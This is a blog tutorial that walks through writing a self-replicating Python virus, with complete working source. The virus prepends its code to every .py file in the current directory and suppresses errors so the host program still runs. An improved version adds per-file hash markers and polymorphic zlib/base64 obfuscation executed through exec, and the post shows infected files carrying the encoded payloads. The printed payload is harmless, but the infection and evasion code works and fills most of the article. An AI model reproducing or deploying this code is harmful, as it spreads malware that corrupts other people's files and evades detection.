---
title: "How to create a computer virus in Python"
date: 2021-08-30T16:00:47+01:00
author: Davide Mastromatteo
excerpt: "Is it possible to create a self-replicating virus in Python? In this article, we'll find out..."
header:
    teaser: [https://imgs.xkcd.com/comics/retro_virus.png](https://imgs.xkcd.com/comics/retro_virus.png)
categories:
    - Dev
tags:
    - virus
    - python
---
![teaser](https://imgs.xkcd.com/comics/retro_virus.png)

I was relaxing on a beach during my summer leave when I received a mail from a reader that asked me if it is technically possible to write a virus using Python.

The short answer: YES.

The longer answer: yes, BUT... 

Let's start by saying that viruses are a little bit anachronistic in 2021... nowadays other kinds of malware (like [worms](https://en.wikipedia.org/wiki/Computer_worm) for example) are far more common than viruses. Moreover, modern operative systems are more secure and less prone to be infected than MS-DOS or Windows 95 were (sorry Microsoft...) and people are more aware of the risk of malware in general.

Moreover, to write a computer virus, probably Python is not the best choice at all. It's an interpreted language and so it needs an interpreter to be executed. Yes, you can embed an interpreter to your virus but your resulting virus will be heavier and a little clunky... let's be clear, to write a virus probably other languages that can work to a lower level and that can be compiled are probably a better choice and that's why in the old days it was very common to see viruses written in  C or Assembly.

That said, it is still possible to write computer viruses in Python, and in this article, you will have a practical demonstration.

> I met my first computer virus in 1988. I was playing an old CGA platform game with my friend Alex, that owned a wonderful [Olivetti M24](https://en.wikipedia.org/wiki/Olivetti_M24) computer (yes, I'm THAT old...) when the program froze and a little ball started to go around the screen. We had never seen anything like that before and so we didn't know it back then, but we were facing the [Ping-Pong virus](https://en.wikipedia.org/wiki/Ping-Pong_virus) one of the most famous and common viruses ever... at least here in Italy.

Now, before start, you know I have to write a little disclaimer. 

---

This article will show you that a computer virus in Python is possible and even easy to be written. However, ***I am NOT encouraging you to write a computer virus*** (neither in Python nor in ANY OTHER LANGUAGES), and I want to remember you that **HARMING AN IT SYSTEM IS A CRIME**!

---

Now, we can proceed.

According to Wikipedia...

> a [computer virus](https://en.wikipedia.org/wiki/Computer_virus) is a computer program that, when executed, replicates itself by modifying other computer programs and inserting its own code. If this replication succeeds, the affected areas are then said to be "infected" with a computer virus, a metaphor derived from biological viruses.

That means that our main goal when writing a virus is to create a program that can spread around and replicate infecting other files, usually bringing a "payload", which is a malicious function that we want to execute on the target system.

Usually, a computer virus does is made by three parts:

1. The infection vector: this part is responsible to find a target and propagates to this target
2. The trigger: this is the condition that once met execute the payload
3. The payload: the malicious function that the virus carries around

Let's start coding.

```python
try:
    # retrieve the virus code from the current infected script
    virus_code = get_virus_code() 

    # look for other files to infect
    for file in find_files_to_infect():
        infect(file, virus_code)

    # call the payload
    summon_chaos()

# except:
#     pass

finally:
    # delete used names from memory
    for i in list(globals().keys()):
        if(i[0] != '_'):
            exec('del {}'.format(i))

    del i
```

Let's analyze this code.

First of all, we call the `get_virus_code()` function, which returns the source code of the virus taken from the current script.

Then, the `find_files_to_infect()` function will return the list of files that can be infected and for each file returned, the virus will spread the infection.

After the infection took place, we just call the `summon_chaos()` function, that is - as suggested by its name - the payload function with the malware code.

That's it, quite simple uh?

Obviously, everything has been inserted in a `try-except` block, so that to be sure that exceptions on our virus code are trapped and ignored by the `pass` statement in the `except` block.

The `finally` block is the last part of the virus, and its goal is to remove used names from memory so that to be sure to have no impact on how the infected script works.

Okay, now we need to implement the stub functions we have just created! :) 

Let's start with the first one: the `get_virus_code()` function.

To get the current virus code, we will simply read the current script and get what we find between two defined comments.

For example: 

```python
def get_content_of_file(file):
    data = None
    with open(file, "r") as my_file:
        data = my_file.readlines()

    return data

def get_virus_code():

    virus_code_on = False
    virus_code = []

    code = get_content_of_file(__file__)

    for line in code:
        if "# begin-virus\n" in line:
            virus_code_on = True

        if virus_code_on:
            virus_code.append(line)

        if "# end-virus\n" in line:
            virus_code_on = False
            break

    return virus_code
```

Now, let's implement the `find_files_to_infect()` function. Here we will write a simple function that returns all the `*.py` files in the current directory. Easy enough to be tested and... safe enough so as not to damage our current system! :)

```python
import glob

def find_files_to_infect(directory = "."):
    return [file for file in glob.glob("*.py")]
```

This routine could also be a good candidate to be written with a generator. What? You don't know generators? Let's have a look at [this interesting article](http://thepythoncorner.com/dev/iterators-generators-python/) then! ;)

And once we have the list of files to be infected, we need the infection function. In our case, we will just write our virus at the beginning of the file we want to infect, like this:

```python
def get_content_if_infectable(file):
    data = get_content_of_file(file)
    for line in data:
        if "# begin-virus" in line:
            return None
    return data

def infect(file, virus_code):
    if (data:=get_content_if_infectable(file)):
        with open(file, "w") as infected_file:
            infected_file.write("".join(virus_code))
            infected_file.writelines(data)
```

Now, all we need is to add the payload. Since we don't want to do anything that can harm the system, let's just create a function that prints out something to the console.

```python
def summon_chaos():
  # the virus payload
  print("We are sick, fucked up and complicated\nWe are chaos, we can't be cured")
```

Ok, our virus is ready! Let's see the full source code:

```python
# begin-virus

import glob

def find_files_to_infect(directory = "."):
    return [file for file in glob.glob("*.py")]

def get_content_of_file(file):
    data = None
    with open(file, "r") as my_file:
        data = my_file.readlines()

    return data

def get_content_if_infectable(file):
    data = get_content_of_file(file)
    for line in data:
        if "# begin-virus" in line:
            return None
    return data

def infect(file, virus_code):
    if (data:=get_content_if_infectable(file)):
        with open(file, "w") as infected_file:
            infected_file.write("".join(virus_code))
            infected_file.writelines(data)

def get_virus_code():

    virus_code_on = False
    virus_code = []

    code = get_content_of_file(__file__)

    for line in code:
        if "# begin-virus\n" in line:
            virus_code_on = True

        if virus_code_on:
            virus_code.append(line)

        if "# end-virus\n" in line:
            virus_code_on = False
            break

    return virus_code

def summon_chaos():
    # the virus payload
    print("We are sick, fucked up and complicated\nWe are chaos, we can't be cured")

# entry point 

try:
    # retrieve the virus code from the current infected script
    virus_code = get_virus_code() 

    # look for other files to infect
    for file in find_files_to_infect():
        infect(file, virus_code)

    # call the payload
    summon_chaos()

# except:
#     pass

finally:
    # delete used names from memory
    for i in list(globals().keys()):
        if(i[0] != '_'):
            exec('del {}'.format(i))

    del i

# end-virus
```

 

Let's try it putting this virus in a directory with just another `.py` file and let see if the infection starts. Our victim will be a simple program named `[numbers.py](http://numbers.py)` that returns some random numbers, like this:

```python
 # numbers.py

import random

random.seed()

for _ in range(10):
  print (random.randint(0,100))

```

When this program is executed it returns 10 numbers between 0 and 100, super useful! LOL!

Now, in the same directory, I have my virus. Let's execute it:

```bash
/playgrounds/python/first ❯ python ./first.py                                                                          02:30:42 PM
We are sick, fucked up and complicated
We are chaos, we can't be cured
```

As you can see, our virus has started and has executed the payload. Everything is fine, but what happened to our `[numbers.py](http://numbers.py)` file? It should be the victim of the infection, so let's see its code now.

```python
# begin-virus

import glob

def find_files_to_infect(directory = "."):
    return [file for file in glob.glob("*.py")]

def get_content_of_file(file):
    data = None
    with open(file, "r") as my_file:
        data = my_file.readlines()

    return data

def get_content_if_infectable(file):
    data = get_content_of_file(file)
    for line in data:
        if "# begin-virus" in line:
            return None
    return data

def infect(file, virus_code):
    if (data:=get_content_if_infectable(file)):
        with open(file, "w") as infected_file:
            infected_file.write("".join(virus_code))
            infected_file.writelines(data)

def get_virus_code():

    virus_code_on = False
    virus_code = []

    code = get_content_of_file(__file__)

    for line in code:
        if "# begin-virus\n" in line:
            virus_code_on = True

        if virus_code_on:
            virus_code.append(line)

        if "# end-virus\n" in line:
            virus_code_on = False
            break

    return virus_code

def summon_chaos():
    # the virus payload
    print("We are sick, fucked up and complicated\nWe are chaos, we can't be cured")

# entry point 

try:
    # retrieve the virus code from the current infected script
    virus_code = get_virus_code() 

    # look for other files to infect
    for file in find_files_to_infect():
        infect(file, virus_code)

    # call the payload
    summon_chaos()

# except:
#     pass

finally:
    # delete used names from memory
    for i in list(globals().keys()):
        if(i[0] != '_'):
            exec('del {}'.format(i))

    del i

# end-virus
# numbers.py

import random

random.seed()

for _ in range(10):
  print (random.randint(0,100))
```

And as expected, now we have our virus before the real code.

Let's create another `.py` file in the same directory, just a simple "hello world" program:

```bash
/playgrounds/python/first ❯ echo 'print("hello world")' > hello.py
```

and now, let's execute the `[numbers.py](http://numbers.py)` program:

```bash
/playgrounds/python/first ❯ python numbers.py                                                                          02:35:12 PM
We are sick, fucked up and complicated
We are chaos, we can't be cured
35
43
89
37
92
71
4
21
83
47
```

As you can see, the program still does whatever it was expected to do (extract some random numbers) but only after having executed our virus, which has spread to other `*.py` files in the same directory and has executed the payload function. Now, if you look at the `[hello.py](http://hello.py)` file, you will see that it has been infected as well, as we can see running it:

```bash
/playgrounds/python/first ❯ python hello.py                                                                            02:40:01 PM
We are sick, fucked up and complicated
We are chaos, we can't be cured
hello world
```

## Trying to hide the virus code a little more

Now, even if this virus could be potentially dangerous, it is easily detectable. You don't have to be Sherlock Holmes to recognize a virus that is written in plain text and starts with `# begin-virus`, right? 

So what can we do to make it a little harder to find?

Not much more, since we're writing it in Python and Python is an interpreted language... however, maybe we can still do something.

For example, wouldn't it be better if we could consider as infected any single file that contains the md5 hash of its name as a comment? 

Our virus could start with something like `# begin-78ea1850f48d1c1802f388db81698fd0` and end with something like `# end-78ea1850f48d1c1802f388db81698fd0` and that would be different for any infected file, making it more difficult to find all the infected files on the system.

So our `get_content_if_infectable()` function could be modified like this:

```python
def get_content_if_infectable(file, hash):
    # return the content of a file only if it hasn't been infected yet
  data = get_content_of_file(file)

  for line in data:
    if hash in line:
      return None

  return data
```

Obviously, before calling it you should calculate the hash of the file you're going to infect like this:

```python
hash = hashlib.md5(file.encode("utf-8")).hexdigest()
```

and also the `get_virus_code()` function should be modified to look for the current script hash:

```python
def get_virus_code():
  # open the current file and returns the virus code, that is the code between the
  # begin-{hash} and the end-{hash} tags
  virus_code_on = False
  virus_code = []

  virus_hash = hashlib.md5(os.path.basename(__file__).encode("utf-8")).hexdigest()
  code = get_content_of_file(__file__)

  for line in code:
    if "# begin-" + virus_hash in line:
      virus_code_on = True

    if virus_code_on:
      virus_code.append(line + "\n")

    if "# end-" + virus_hash in line:
      virus_code_on = False
      break

  return virus_code
```

And what about our virus source code? Can it be obfuscated somehow to be a little less easy to spot? 

Well, we could try to obscure it by making it different every time we infect a new file, then we can compress it by using the `zlib` library and converting it in `base64` format. We could just pass our plain text virus to a new `transform_and_obscure_virus_code()` function like this:

```python
def obscure(data: bytes) -> bytes:
    # obscure a stream of bytes compressing it and encoding it in base64
    return base64.urlsafe_b64encode(zlib.compress(data, 9))

def transform_and_obscure_virus_code(virus_code):
    # transforms the virus code adding some randomic contents, compressing it and converting it in base64
  new_virus_code = []
  for line in virus_code:
    new_virus_code.append("# "+ str(random.randrange(1000000))+ "\n")
    new_virus_code.append(line + "\n")

  obscured_virus_code = obscure(bytes("".join(new_virus_code), 'utf-8'))
  return obscured_virus_code
```

Obviously, when you obscure your virus compressing it and encoding it in base64 the code is not executable anymore, so you will have to transform it to the original state before executing it. This will be done in the `infect` method, by using the exec statement like this: 

```bash
def infect(file, virus_code):
  # infect a single file. The routine opens the file and if it's not been infected yet, infect the file with a custom version of the virus code
  hash = hashlib.md5(file.encode("utf-8")).hexdigest()

  if (data:=get_content_if_infectable(file, hash)):
    obscured_virus_code = transform_and_obscure_virus_code(virus_code)
    viral_vector = "exec(\"import zlib\\nimport base64\\nexec(zlib.decompress(base64.urlsafe_b64decode("+str(obscured_virus_code)+")))\")"

    with open(file, "w") as infected_file:
      infected_file.write("\n# begin-"+ hash + "\n" + viral_vector + "\n# end-" + hash + "\n")
      infected_file.writelines(data)

```

 

The complete source code of our new virus could be similar to this:

```python
# ################
# chaos.py
# a Python virus
# ###############

# begin-78ea1850f48d1c1802f388db81698fd0

import base64
import glob
import hashlib
import inspect
import os
import random
import zlib

def get_content_of_file(file):
  data = None
    # return the content of a file
  with open(file, "r") as my_file:
    data = my_file.readlines()

  return data
  
def get_content_if_infectable(file, hash):
    # return the content of a file only if it hasn't been infected yet
  data = get_content_of_file(file)

  for line in data:
    if hash in line:
      return None

  return data

def obscure(data: bytes) -> bytes:
    # obscure a stream of bytes compressing it and encoding it in base64
    return base64.urlsafe_b64encode(zlib.compress(data, 9))

def transform_and_obscure_virus_code(virus_code):
    # transforms the virus code adding some randomic contents, compressing it and converting it in base64
  new_virus_code = []
  for line in virus_code:
    new_virus_code.append("# "+ str(random.randrange(1000000))+ "\n")
    new_virus_code.append(line + "\n")

  obscured_virus_code = obscure(bytes("".join(new_virus_code), 'utf-8'))
  return obscured_virus_code

def find_files_to_infect(directory = "."):
  # find other files that can potentially be infected 
  return [file for file in glob.glob("*.py")]

def summon_chaos():
  # the virus payload
  print("We are sick, fucked up and complicated\nWe are chaos, we can't be cured")

def infect(file, virus_code):
  # infect a single file. The routine open the file and if it's not been infected yet, infect the file with a custom version of the virus code
  hash = hashlib.md5(file.encode("utf-8")).hexdigest()

  if (data:=get_content_if_infectable(file, hash)):
    obscured_virus_code = transform_and_obscure_virus_code(virus_code)
    viral_vector = "exec(\"import zlib\\nimport base64\\nexec(zlib.decompress(base64.urlsafe_b64decode("+str(obscured_virus_code)+")))\")"

    with open(file, "w") as infected_file:
      infected_file.write("\n# begin-"+ hash + "\n" + viral_vector + "\n# end-" + hash + "\n")
      infected_file.writelines(data)

def get_virus_code():
  # open the current file and returns the virus code, that is the code between the
  # begin-{hash} and the end-{hash} tags
  virus_code_on = False
  virus_code = []

  virus_hash = hashlib.md5(os.path.basename(__file__).encode("utf-8")).hexdigest()
  code = get_content_of_file(__file__)

  for line in code:
    if "# begin-" + virus_hash in line:
      virus_code_on = True

    if virus_code_on:
      virus_code.append(line + "\n")

    if "# end-" + virus_hash in line:
      virus_code_on = False
      break

  return virus_code

# entry point

try:
  # retrieve the virus code from the current infected script
  virus_code = get_virus_code()

  # look for other files to infect
  for file in find_files_to_infect():
    infect(file, virus_code)

  # call the payload
  summon_chaos()

except:
  pass

finally:
  # delete used names from memory
  for i in list(globals().keys()):
      if(i[0] != '_'):
          exec('del {}'.format(i))

  del i

# end-78ea1850f48d1c1802f388db81698fd0
```

Now, let's try this new virus in another directory with the uninfected version of `[numbers.py](http://numbers.py)` and `[hello.py](http://hello.py)`, and let's see what happens.

```bash
/playgrounds/python/chaos ❯ python chaos.py                                                                            03:09:52 PM
We are sick, fucked up and complicated
We are chaos, we can't be cured
```

Executing the virus we have the same behavior as we had before, but our infected files are now a little different than before... This is `[numbers.py](http://numbers.py)` :

```bash
# begin-661bb45509227577d3693829a1e1cb33
exec("import zlib\nimport base64\nexec(zlib.decompress(base64.urlsafe_b64decode(b'eNqVWMty47oRXUtfgdALkxkNC2-AU-Uss8zqVmUxvsWiRNBmLJEqkhqPc-v-expAk5JsOZmoaqwHmo2Dfpw-mDtSWM6MWt-RrXtqu6_GuopZRRtpa7ZjlvJGWFtvLdOFbWq6XoOpKKhldh0-S8YMtev2cOyHiWyr0WkZFhjjtFDzwtO-38afjTF2-fm5Gp_3bVzRtDCsmFfabjy63RRWOKXMsnmlH-OP1moj5h-Hqqv7A6IT0sp54d-ze2WE0iyCVkxxIda1a8iTm8pd302um8q-KZt271L_J_sW4SpBpVyv6mqqyAP5R9-5uLtmUuo1gdcdGdx0GjoyPTuCrkjfkIp4PxESV0KJ9eq1nZ5Jf3Rd2GJDkiHJSDWSw1vY-BsaF5SB8bwnLuaDq-p927kxzYKdKYQymAUutdR2vUIk_kmMqTFw6FX4YgvOBf9w6rYp266BWFdbPPsm5AUjYFRhDf-Fk5K-27-RtiFtyGt3D-XgXEeic1eTNxfTWVhhuF1i-mkGcHsuaBFPWRjFqFqvmn4gPhLgOhw1ApVC2QLcrgCCx-9XvRVGVUtmC1idY7SkUiomuI47CKoKfiOO4FowtNFaWSZDGPvtuDsNLg0gyPZtcmNGvv4tfkJUWkhNMXxoDwEbJ0jnwQcv2EI0D8fBjWPbPfn4QTUT1-36Gr_DUS5aq2CSSht8ItC4mJ-G_Vg1rtxqGZ52qS__fHYecG5IkWXYoaLgGFoF4QGX_lAT9NIIIT6UgKJEyOWPdjiNZfB5_jiXCBdmKZHl8TGUSTAm3phUdTjO2B8c9mu7m8to3NwKASz-cMN0MwhCMs6hGDr3egEO6un773HdckPFdbGc7RC4VApSv3rnJK-O0KN1mtyR5ItPVRrh5v4N_j25lNHwyrIvJHnskrlWNYXK-MxdQHFpr5meGUly4DMoPAx3fX2kuc5CraRJkv-rb7v0epdsQ-5PU_PV3mN6_dEKs9TyDc-RFXShgKdjRUjKIKa-CpoWku_bcCynHgkirdsB3vrhDTAleTJzJMwLINzVXXiI9JD2ITCCr4BqIruqI8feZ7mt9kARW3fmBEwVcJlekH4PbOLzFj5A3vz0yP2fNPlrfnxLsphiXTAuJXIDDDLDAvTxdDj0Xbl7rnrgSsTIgf2ox3guymP1tu-rOsafSuUhHIe2m9Lkn1Ct0Kdju3vZkOa0ewGopyPW5OG4b3cVoH_s0C5stSGvzp818B4JscY8c8qNwT4TnsQCTIxpJNwPPWW14L4g7tDOcwb0gQ-MHwbkNzjG0J8mX1N-ooRzhXh5kIGF70fS9TdIeDO7XB4Jc6kCzOPUHwi03Nj2nSen6w5e5i4EKjDswzzA80Otwkly5J0klGKSZfmz-1m3T26ccGzJAgTAzDpUURAfnrEjhz780mDCEBUm0ODqk6b5f3gMBwFgAzQrWKj25Y9Q6r7S3U-3Sx-TC0Xx-NhdKR74HowC3dZuIdyPvOwXfXy-eFq5ATz7AkHLHpMswd6ygvMYLaNBwHi2-iAjXqOMmJN8KSYol9yLidXVYv46tBOgeOxm4QdEF1Ia-QneroIQfr2DkVR_9WsXlljhShf0s22iaPH5RWPGKGDC1rBnRXKRG0wxjCXOlO-CpcYhYIPXHUutR9Z4P202kXvaEcUKlMTWTa8ueon0oZjhxjuPIfjDH-vP4NM_4w-LP03VUxSdoIKDHDwjLaFRHsjfq_2IdKqoFvbS4jySNKUwZbH0DVfSzHY3uqkf82M1Pee-hLrq4NIyhLQss__dYwyo0ADb4fa3FNbiLSITwOCob2Ag-KRcDc7zyPQsy1BlJUvxxHqZD3IlvCSMFyDm1epD0H4bTg4FIehBpARNrZXo_-qBbwhUKiqvvX06X5lmBc5XYaURZ9hzIX8GGsYRC1TwXzLN4XJUBChb0HIv8Tl4jOGWhQLlrJap9m7sGg4yn2ItgHY32BAwTGW4j0GyYM4eYdBPs1iwVMwpYoWSazDANqFwOOYrGTYbWvfDvddezQDEftk-y0AYd0N7xHuWUSCw39Xu-8ZEWhFUY8ZAkrPYRvu-fwlz-0oC9LhXRGotU6jK5ul-U2rMBGAZ12Y988rHaRnjYUWh8CoEMkoY7eHsQG2EM18OemWVgdCtrkUCyoliuSFyuFwptXY_d-44oYSAIlUA5ViNSAZFAZSMydb-6rCGo3iJs1xImA7kVbu9mxw5jRBv38tjzMfBHUBLxefhymdpjEsbaxG62UseqLc0y1_cG7xhUODGziSk2wvutknb7_R38pcHcl_enxUZj8v-FSbTPWAgf_x5n_uJWE1piyoRigrcoQilBlQHXMzAtJ3litZ2vjRrDjeZ2Dy_8P8E_wH6PJBm')))")
# end-661bb45509227577d3693829a1e1cb33
# numbers.py

import random

random.seed()

for _ in range(10):
  print (random.randint(0,100))
```

and this is 

```bash
# begin-8d35108ffe2ad173a697734a3e9938e1
exec("import zlib\nimport base64\nexec(zlib.decompress(base64.urlsafe_b64decode(b'eNqVWEtv20YQPku_YksfTDUKwX3vFnCPPfYUoIc4IChxabOWSIGk4rhB_3tn9iFLfrSpgVgydzj8ZuabmY-5IlaUVJvlFdm4u67_qI2rqZFlK0xDt9SUrOXGNBtDlTVtUy6XYGqUNlQs_XeqBVd62e0PwziTTT05JfwBo1zRdP1uN2z8VcWsNiJdvq-n-123iY7gBptOun46uO0cPCkuGEsnw-QvCqv46bFj3TfDPrhRQojTwV_Ju7WA0wbIRjOm5LJxLblzc7Ud-tn1czW0VdvtXI6_Vr94S62FgXAWTT3X5Ib8PvTOX-faYNAEfq7I6Obj2JP53pHoigwtqQn6CfitltQsF4_dfE-Gg-v9I9YkG7MVqSeyf_IPDo-kEKphy0V6ZjwsRlc3u653U76KASlZxhrIUlGqlouIBO8MydaUgs0iYDbSQtFeRt21Vde3kOp6E2Nf-7LEDFBemvIHAiVDv3siXUs6X9X-GrjgXE-Cb9eQJxeKKaSxUMwU3rsFCJXipjSxaFJCAMtFO4wE8wCefaABpmSGWg1ZAwSIHk_RKpxyJa2FexcpQ6dCMq41sDRRRJX8dRalYUKV0UZorplP4rCZtsfR5R4E2TzNblqRj7-Gb-G5SjCpVcxetId8TTMUc4-587aQzP1hdNPU9XeYPuAycf12aOLfEMpZWxkpUkUi0HBYHMfdVLeu2ijh73Y5kr9Izj3ONbGrkFltKaYzBFUa8IgxzdBIE2R4XwGIKiKuvnbjcaq8y-evkR9cWF6mEE-3T54k3pigMakbH8007F1s1m6bSDSt38oAHH514_xmDii1JVRk0bvHM3DAps9fQsWgqEpdcuXZLgBnWmkkzKWPoj5AfzZ5dkWyD1ioPKAt8AP-3bmclv5ntfpAsts-C-nkVmuj3nXnQZzbS0qljumnMIGBg4uY7uYypEQzT5U8y4o_h67PLx-zWpPr49x-NNexulaX1jxT-Q3PwcxwbmVAoQ0wm3oWtB0UH5twquYhToe86Ub4GMYnwJQVWSq_VUbCg678TWSAso9-HiAD6pls654cBqxyV-9gQGzc80SIpWJMihPSz36WYN38F6gbbo4Cf-XZz8XhKVt9ia1VKpXmOewmrjz06bjfD321va8HGJSx0qWMGJ9JeaifdkPdxJVkGNRicRi7fs6zP4Ct0KZTt31Yk_a4fQCox0Pk5P6w67Y1oL_to51_1Jo8OozVTz3icx0LzWDhmYhTc-i5kOKY1DBuXzWVkQZ7HBAHO5wZ0AiYGVwF5BPEMQ7HGVmF-8QH5hOGKP0Qvp5IP7wxg9fJ5ekWv5VqAD3Nw55Az03d0ONwumzhEEHJYXAsF37E3qT1Xewb6UMp4uDJPBmz1aq4d9-a7s5Nc9xaRkCt4iyVVnIoG47sMERvfmgvpdWsDGNAnHfa5v9MsrhDYSLgjoCDeld99WRHrrtvbpvfZmeC4va2v5A78Lc38vO2caeJ-3ow4yHm5wNOljeArz5A0la32SoLmEQpYKvFTqO6xAnzSkU8BhWRqnymJTSIBCFx710cFo9jNwOK2z6pPph1vqRhRMHHRRL81SvYSc1HPDuzTMNPMvneY4JmwfoGY-hbwSMDmGXCmJMkOatOLLK1QjDfuieaQ8pGVB4nuofJ8XLjrMP86aYoV4AUGzc_uuAlqlgJcxydhyR8x8D-9j7xHgw3XprruykuDa5K4P8z0gp65Yb8Vu-m4JRKwTk7tzhbS0YoEWeB0tKKZPZGOw1Tcajn-wI51Nd7l1c-p1W1-u8mg66iHOoRn_6WxDp5izwDEZT2gKKgcS535_PWxNrhKTZtdmJPIEwK5EJ6WcgG99LrZc4-jceYstIqGlUeaHqQ3MH_xQ1xlHNjcZSfe3t3x0IpTNpuSiqmTrATk98DrSXz1v9SZ2ENQ5yLDWi5h_A8q0AeplcMKDA9rbUXe1dSZniyBDmnIkpuBLQr4pthzx5g0c-JLMJGlSo1Z8AcMAhYhfIaeeHl-di5r-6l9mpHmOvnrXPaB9N27A7xHYuDCnzJ25dNGUWD5FJFwMxvXnj4bhge_N6-kABDfFZ8IdSGlYFZabu_KTVS8xvQJF7Tv7Mso3oSHCgRyabhNQ_hbEFt-JgvFr2C_gOHlyIhHYn0pkEhPpAk7tvWHeYoczSscZQI9TTFbQGX4tuXshLU1hJCQYkT-6QUQD5E0ridmx05TpBvbOQp1GPv9qClgnMJwkuEvHSBiNDKKHmAbfmqeHBP8JHex2DpYcZRcHdt3n0uv5Cfbsh1dZ0MhKHMBgP88ZvpGlCQ739fF7gR6znv0lsAcLZkkYggkzj0Fpp2IQjIrYqpNajyQ-f8wH8R_APeFJAZ')))")
# end-8d35108ffe2ad173a697734a3e9938e1
print("hello world")
```

Look at that, it's not so easy to be read now, right? And every infection is different than the other one! Moreover, every time the infection is propagated, the compressed byte64 virus is compressed and encoded again and again. 

And this is just a simple example of what one could do... for example, the virus could open the target and put this piece of code at the beginning of a random function, not always at the beginning of the file, or put it in another file and make just a call to this file with a malicious `import` statement or so... 

## To sum up

In this article, we have seen that writing a computer virus in Python is a trivial operation, and even if it's probably not the best language to be used for writing viruses... it's worth keeping your eyes wide open, especially on a production server. :)

Happy coding!

D.
